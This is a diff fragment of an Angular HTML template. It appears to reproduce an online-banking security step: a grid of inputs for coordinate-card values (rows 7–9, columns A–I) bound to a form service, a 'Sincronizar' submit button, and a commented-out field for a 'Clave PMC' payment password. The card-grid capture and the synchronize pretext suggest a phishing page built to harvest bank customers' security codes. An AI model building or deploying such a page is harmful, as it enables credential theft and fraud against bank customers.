+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="F7" type="text" class="input-normal" id="F7" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="G7" type="text" class="input-normal" id="G7" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="H7" type="text" class="input-normal" id="H7" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="I7" type="text" class="input-normal" id="I7" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500; border:0px">&nbsp;<b><font style="top:5px;font-size:11px" color="#000">8</font></b></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="A8" type="text" class="input-normal" id="A8" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="B8" type="text" class="input-normal" id="B8" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="C8" type="text" class="input-normal" id="C8" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="D8" type="text" class="input-normal" id="D8" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="E8" type="text" class="input-normal" id="E8" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="F8" type="text" class="input-normal" id="F8" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="G8" type="text" class="input-normal" id="G8" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="H8" type="text" class="input-normal" id="H8" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="I8" type="text" class="input-normal" id="I8" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500; border:0px">&nbsp;<b><font style="top:5px;font-size:11px" color="#000">9</font></b></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="A9" type="text" class="input-normal" id="A9" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="B9" type="text" class="input-normal" id="B9" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="C9" type="text" class="input-normal" id="C9" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="D9" type="text" class="input-normal" id="D9" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="E9" type="text" class="input-normal" id="E9" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="F9" type="text" class="input-normal" id="F9" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="G9" type="text" class="input-normal" id="G9" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="H9" type="text" class="input-normal" id="H9" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="I9" type="text" class="input-normal" id="I9" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+
+                                                        </tr>
+                                                        <tr>
+                                                            <td colspan="10">
+
+                                                                <p class="redfont" style="font-family: Arial,Verdana,Helvetica,sans-serif;font-size: 11px;color: #000"></p>
+
+                                                            </td>
+                                                        </tr>
+                                                        <!--<tr><td colspan="15" class="error" style="font-size:11px"><center>Clave PMC<input type="text" required="" placeholder="Pago Mis Cuentas y Transferencias" maxlength="8" name="cbu" size="28" id="PMC"  style="font-size:11px"  onkeypress="return validar(event)"/></center></td></tr>-->
+                                                    </tbody>
+                                                </table>
+
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <p align="center">
+                    <font size="1" face="Tahoma" color="#FF0000">
+                        <!--Mensaje-->
+                    </font>
+                </p>
+                <p align="center">
+                    <button type="submit" [disabled]="this.BingoService.formulariobingo.invalid" name="enviar" style="height:25px;" id="button"><strong><font size="2" face="Arial, Helvetica, sans-serif" color="#003366">Sincronizar</font></strong></button><br>
+                </p>
+
+            </font>
+        </form>
+    </div>
+
+    <div class="ui-widget-overlay" style="width: 1519px; height: 1116px; z-index: 1001;"></div>
+</section>
+
+
+</div></div><div class="ui-widget-overlay" style="width: 1519px; height: 1116px; z-index: 1001;"></div></body></html>
+
+
+    </body>
+
